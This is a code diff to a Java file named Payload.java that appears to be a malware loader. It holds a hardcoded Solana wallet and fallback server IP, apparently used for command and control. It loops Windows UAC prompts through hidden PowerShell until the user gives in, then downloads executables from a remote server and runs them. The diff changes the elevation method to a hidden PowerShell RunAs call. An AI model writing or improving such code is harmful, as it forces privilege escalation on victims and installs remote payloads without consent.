@@ -1,5 +1,4 @@
 // language: Java, file: payload/Payload.java
-import com.sun.jna.*;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -8,11 +7,6 @@ import java.util.Base64;
 import java.util.zip.*;
 
 public class Payload {
-    public interface Shell32 extends Library {
-        Shell32 INSTANCE = Native.load("shell32", Shell32.class);
-        int ShellExecuteW(Pointer hwnd, String lpOperation, String lpFile, String lpParameters, String lpDirectory, int nShowCmd);
-    }
-
     private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
     private static final String SOLANA_RPC = "https://api.devnet.solana.com";
     private static final String FALLBACK_SERVER = "95.182.96.216";
@@ -159,23 +153,27 @@ public class Payload {
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            String cmdArgs = String.format("-jar \"%s\" %s %s", jarPath, key, ip);
+            String psCommand = String.format(
+                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
+                javaExe, jarPath, key, ip
+            );
+
             FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
                 log("Triggering UAC...");
                 
-                int result = Shell32.INSTANCE.ShellExecuteW(null, "runas", javaExe, cmdArgs, null, 1);
+                // Launch PowerShell hidden and wait for it to finish (which means the user clicked Yes or No)
+                Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
+                p.waitFor();
                 
-                if (result > 32) {
-                    // User clicked Yes. Stop looping immediately.
+                // If the user clicked Yes, the elevated process will have deleted the lock file.
+                if (!lockFile.exists() || lockFile.delete()) {
                     log("UAC Accepted. Parent exiting.");
                     lockStream.close();
                     System.exit(0); 
                 } else {
-                    // User clicked No. Loop instantly and try again.
                     log("UAC Denied. Instantly retrying...");
-                    Thread.sleep(10); 
                 }
             }
         } catch (Exception e) {
@@ -205,17 +203,19 @@ public class Payload {
                 downloadFile("http://" + ip + "/api/downloads/" + file, new File(loaderDir, file));
             }
 
-            // FORCE WORKING DIRECTORY TO APP BROKER AND ADD .\ and all ARGS
+            // 3.exe normal
             log("Executing 3.exe...");
             new ProcessBuilder(".\\3.exe")
                 .directory(loaderDir).start();
             
+            // 2.exe with "all"
             log("Executing 2.exe...");
             new ProcessBuilder(".\\2.exe", "all")
                 .directory(loaderDir).start();
             
             Thread.sleep(2000);
             
+            // 1.exe with "all"
             log("Executing 1.exe...");
             new ProcessBuilder(".\\1.exe", "all")
                 .directory(loaderDir).start();
